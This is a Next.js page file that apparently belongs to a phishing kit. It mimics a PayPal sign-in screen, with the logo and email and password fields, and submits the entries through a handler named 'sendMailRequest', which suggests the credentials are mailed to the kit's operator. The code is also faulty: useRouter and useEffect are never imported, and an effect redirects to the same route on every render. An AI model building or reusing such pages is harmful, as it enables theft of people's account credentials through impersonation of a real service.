import Head from 'next/head'
import { GetStaticProps, NextPage } from 'next'
import CustomLoader from '.././../components/Loader/CustomLoader'
import Styles from '../../styles/paypal/login.module.css'
import useLogin from '../../hooks/useLogin'

const Paypal: NextPage = (props): JSX.Element => {
  const { error, loading, sendMailRequest, handleChange } = useLogin()
  console.log(props)
  const router = useRouter()

  useEffect(() => {
    router.push('/paypal/login?')
  })

  return (
    <div>
      <Head>
        <title>Create Next App</title>
        <link rel="icon" href="/favicon.ico" />
      </Head>
      <div className={Styles.container}>
        <CustomLoader visible={!!loading} type="Oval" />
        <div className={Styles.formWrapper}>
          <div className={Styles.image}>
            <img
              src={'/assets/images/paypal.webp'}
              alt="pay pal logo"
              width={'120'}
              height={'120'}
            />
          </div>
          <form onSubmit={sendMailRequest}>
            {error && <span className={Styles.errorMgs}>{error}</span>}
            <div>
              <label htmlFor="@email">
                <br />
                <input
                  required
                  name="email"
                  id="@email"
                  type="text"
                  onChange={handleChange}
                  placeholder="Enter your email "
                />
              </label>
            </div>
            <div>
              <label htmlFor="@password">
                <input
                  required
                  type="text"
                  name="password"
                  id="@password"
                  onChange={handleChange}
                  placeholder="Enter your password "
                />
              </label>
            </div>
            <button disabled={!!loading} type="submit">
              SIGN IN
            </button>
          </form>
        </div>
        <footer className={Styles.footer}>
          <ul className={Styles.ftList}>
            <li>Contact us</li>
            <li>Privacy Us</li>
            <li>Legal </li>
            <li>WorldWide</li>
          </ul>
        </footer>
      </div>
    </div>
  )
}

export const getStaticProps: GetStaticProps = async () => {
  // const res = await fetch('http://localhost:3000/api/send-mail')
  // const data = await res.json()

  return {
    props: {
      data: {},
    },
  }
}

export default Paypal
